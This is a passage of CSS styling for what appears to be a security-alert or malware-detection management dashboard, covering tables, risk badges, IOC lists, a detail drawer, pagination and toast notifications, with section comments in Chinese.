  top: 50%;
  transform: translateY(-50%);
  width: 16px;
  height: 16px;
  color: #9ca3af;
  pointer-events: none;
}

.filter-search-input {
  height: 36px;
  width: 260px;
  padding: 0 14px 0 34px;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  font-size: 13px;
  color: #374151;
  background: #fff;
}

.filter-search-input:focus {
  outline: none;
  border-color: #da203e;
  box-shadow: 0 0 0 3px rgba(218, 32, 62, 0.1);
}

.filter-search-input::placeholder {
  color: #9ca3af;
}

/* ===== 表格卡片 ===== */
.manage-card {
  background: #fff;
  border-radius: 10px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
  padding: 20px 24px;
  border: 1px solid #f0f0f0;
}

.manage-card-title {
  margin: 0 0 16px;
  font-size: 16px;
  font-weight: 600;
  color: #111827;
}

.manage-table-wrap { overflow-x: auto; }

.manage-table {
  width: 100%;
  border-collapse: collapse;
  font-size: 14px;
}

.manage-table th,
.manage-table td {
  padding: 12px 14px;
  text-align: left;
  border-bottom: 1px solid #f3f4f6;
}

.manage-table th {
  font-weight: 600;
  color: #374151;
  background: #f9fafb;
  white-space: nowrap;
}

.manage-table tbody tr:hover { background: #fafafa; }

.manage-th-op, .manage-td-op { text-align: right; white-space: nowrap; }

.name-cell {
  font-weight: 500;
  color: #111827;
}

.file-cell {
  font-family: 'SF Mono', 'Monaco', 'Menlo', 'Consolas', monospace;
  font-size: 12px;
  color: #6b7280;
  max-width: 180px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.file-cell--link {
  color: #dc2626;
  cursor: pointer;
  transition: color 0.15s;
}
.file-cell--link:hover {
  color: #b91c1c;
  text-decoration: underline;
}

/* ===== 风险等级标签 ===== */
.risk-badge {
  display: inline-block;
  padding: 3px 10px;
  font-size: 12px;
  font-weight: 600;
  border-radius: 6px;
  white-space: nowrap;
}

.risk-badge--critical { background: #7f1d1d; color: #fff; }
.risk-badge--high { background: #fee2e2; color: #dc2626; }
.risk-badge--medium { background: #fef3c7; color: #d97706; }
.risk-badge--low { background: #f0fdf4; color: #16a34a; }
.risk-badge--none { background: #f3f4f6; color: #6b7280; }

/* ===== 恶意类型标签 ===== */
.type-tag {
  display: inline-block;
  padding: 3px 10px;
  font-size: 12px;
  background: #fdf2f8;
  color: #be185d;
  border-radius: 6px;
  white-space: nowrap;
}

/* ===== 状态标签 ===== */
.status-tag {
  display: inline-block;
  padding: 3px 10px;
  font-size: 12px;
  font-weight: 500;
  border-radius: 6px;
  white-space: nowrap;
}

.status-tag--pending { background: #fef3c7; color: #92400e; }
.status-tag--processing { background: #dbeafe; color: #1e40af; }
.status-tag--resolved { background: #d1fae5; color: #065f46; }
.status-tag--ignored { background: #f3f4f6; color: #6b7280; }

/* 恶意类别标签 */
.mal-cat-tag {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
  background: #f3f4f6;
  color: #374151;
}

/* 恶意类型标签 */
.mal-type-tag {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
  background: #fef2f2;
  color: #dc2626;
}

/* 置信度标签 */
.conf-tag {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 500;
}
.conf-tag--high { background: #fef2f2; color: #dc2626; }
.conf-tag--medium { background: #fffbeb; color: #d97706; }
.conf-tag--low { background: #f3f4f6; color: #6b7280; }

/* 检测结果列 */
.detect-cell {
  max-width: 220px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  font-size: 13px;
  line-height: 1.4;
}

/* ===== 操作按钮 ===== */
.action-btn {
  padding: 5px 14px;
  border: none;
  border-radius: 6px;
  font-size: 12px;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.15s;
}

.action-btn--primary {
  background: #da203e;
  color: #fff;
}

.action-btn--primary:hover {
  background: #b91c2d;
}

.action-btn--success {
  background: #16a34a;
  color: #fff;
}

.action-btn--success:hover {
  background: #15803d;
}

.resolved-text {
  font-size: 13px;
  color: #16a34a;
  font-weight: 500;
}

.ignored-text {
  font-size: 13px;
  color: #9ca3af;
}

/* ===== 空状态 ===== */
.manage-empty-row td { padding: 60px 16px; }
.manage-empty {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 16px;
}
.manage-empty-art { width: 120px; height: 100px; opacity: 0.85; }
.manage-empty-art svg { width: 100%; height: 100%; }
.manage-empty-text { margin: 0; font-size: 14px; color: #9ca3af; }

/* ===== 分页 ===== */
.manage-footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 12px;
  margin-top: 16px;
}

.manage-total { font-size: 13px; color: #6b7280; }
.manage-pager { display: flex; align-items: center; gap: 8px; }

.manage-page-btn {
  width: 32px;
  height: 32px;
  padding: 0;
  border: 1px solid #e5e7eb;
  border-radius: 6px;
  background: #fff;
  font-size: 18px;
  line-height: 1;
  color: #374151;
  cursor: pointer;
  transition: border-color 0.15s, color 0.15s;
}

.manage-page-btn:hover:not(:disabled) {
  border-color: #da203e;
  color: #da203e;
}

.manage-page-btn:disabled { opacity: 0.4; cursor: not-allowed; }

.manage-page-current {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  min-width: 32px;
  height: 32px;
  padding: 0 8px;
  border-radius: 6px;
  font-size: 14px;
  font-weight: 600;
  color: #fff;
  background: #da203e;
}

.manage-page-size { margin-left: 4px; }
.manage-page-select {
  height: 32px;
  padding: 0 28px 0 10px;
  border: 1px solid #e5e7eb;
  border-radius: 6px;
  font-size: 13px;
  color: #374151;
  background: #fff;
  cursor: pointer;
}

/* ===== 右侧详情抽屉 ===== */
.drawer-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.3);
  z-index: 1000;
}

.drawer {
  position: fixed;
  top: 0;
  right: 0;
  width: 520px;
  height: 100vh;
  background: #fff;
  box-shadow: -8px 0 30px rgba(0, 0, 0, 0.12);
  display: flex;
  flex-direction: column;
  z-index: 1001;
  transform: translateX(100%);
  transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}

.drawer--open {
  transform: translateX(0);
}

.drawer-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 18px 24px;
  border-bottom: 1px solid #e5e7eb;
  flex-shrink: 0;
}

.drawer-header h3 {
  margin: 0;
  font-size: 17px;
  font-weight: 700;
  color: #111827;
}

.drawer-close {
  width: 32px;
  height: 32px;
  border: none;
  background: none;
  font-size: 20px;
  color: #9ca3af;
  cursor: pointer;
  border-radius: 6px;
  transition: background 0.15s;
  line-height: 1;
}

.drawer-close:hover { background: #f3f4f6; color: #374151; }

.drawer-body {
  flex: 1;
  overflow-y: auto;
  padding: 20px 24px;
}

.drawer-section {
  margin-bottom: 24px;
}

.drawer-section-title {
  font-size: 14px;
  font-weight: 600;
  color: #111827;
  margin: 0 0 12px;
  padding-bottom: 8px;
  border-bottom: 1px solid #e5e7eb;
}

.drawer-info-grid {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.drawer-info-row {
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 14px;
}

.drawer-info-label {
  color: #9ca3af;
  min-width: 70px;
  flex-shrink: 0;
}

.drawer-info-value {
  color: #374151;
  font-weight: 500;
}

.drawer-detect-box {
  background: #f9fafb;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  padding: 14px 16px;
  font-size: 14px;
  line-height: 1.6;
  color: #4b5563;
}

.drawer-rule {
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  margin-bottom: 8px;
  overflow: hidden;
}

.drawer-rule-header {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 10px 14px;
  cursor: pointer;
  font-size: 13px;
  font-weight: 600;
  color: #1f2937;
  background: #f9fafb;
  user-select: none;
  transition: background 0.15s;
}

.drawer-rule-header:hover { background: #f3f4f6; }

.drawer-rule-icon {
  font-size: 10px;
  color: #9ca3af;
  flex-shrink: 0;
}

.drawer-rule-name {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
}

.drawer-rule-lines {
  border-top: 1px solid #e5e7eb;
  background: #1e1e2e;
  padding: 8px 0;
}

.drawer-rule-line {
  padding: 3px 14px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
  color: #e2e8f0;
  line-height: 1.5;
  white-space: pre;
}

.drawer-footer {
  display: flex;
  justify-content: flex-end;
  gap: 12px;
  padding: 16px 24px;
  border-top: 1px solid #e5e7eb;
  flex-shrink: 0;
}

/* ===== 操作按钮 ===== */
.detail-item--full {
  grid-column: 1 / -1;
}

.detail-label {
  font-size: 12px;
  color: #9ca3af;
  font-weight: 500;
}

.detail-value {
  font-size: 14px;
  color: #111827;
}

.detail-value--mono {
  font-family: 'SF Mono', 'Monaco', 'Menlo', 'Consolas', monospace;
  font-size: 12px;
  background: #f9fafb;
  padding: 6px 10px;
  border-radius: 6px;
  word-break: break-all;
  border: 1px solid #f0f0f0;
}

/* ===== 代码块 ===== */
.code-block {
  background: #1e1e1e;
  border-radius: 8px;
  padding: 16px;
  overflow-x: auto;
}

.code-block pre {
  margin: 0;
}

.code-block code {
  font-family: 'SF Mono', 'Monaco', 'Menlo', 'Consolas', monospace;
  font-size: 12px;
  line-height: 1.7;
  color: #d4d4d4;
}

/* ===== IOC 列表 ===== */
.ioc-list {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.ioc-item {
  display: flex;
  align-items: center;
  gap: 10px;
}

.ioc-type-tag {
  display: inline-block;
  padding: 2px 8px;
  font-size: 11px;
  font-weight: 600;
  background: #e0e7ff;
  color: #4338ca;
  border-radius: 4px;
  white-space: nowrap;
  min-width: 40px;
  text-align: center;
}

.ioc-value {
  font-family: 'SF Mono', 'Monaco', 'Menlo', 'Consolas', monospace;
  font-size: 12px;
  background: #f9fafb;
  padding: 3px 8px;
  border-radius: 4px;
  color: #374151;
}

.ioc-empty {
  margin: 0;
  font-size: 13px;
  color: #9ca3af;
}

/* ===== 建议卡片 ===== */
.suggestion-box {
  background: #fffbeb;
  border: 1px solid #fde68a;
  border-radius: 8px;
  padding: 14px 16px;
}

.suggestion-box p {
  margin: 0;
  font-size: 13px;
  color: #92400e;
  line-height: 1.7;
}

/* ===== Toast ===== */
.toast-notification {
  position: fixed;
  top: 24px;
  left: 50%;
  transform: translateX(-50%);
  z-index: 9999;
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 12px 24px;
  background: #111827;
  color: #fff;
  border-radius: 10px;
  font-size: 14px;
  font-weight: 500;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
  animation: toastIn 0.25s ease;
}

@keyframes toastIn {
  from { opacity: 0; transform: translateX(-50%) translateY(-12px); }
  to { opacity: 1; transform: translateX(-50%) translateY(0); }
}

.toast-icon {
  width: 20px;
  height: 20px;
  color: #34d399;
  flex-shrink: 0;
}
</style>
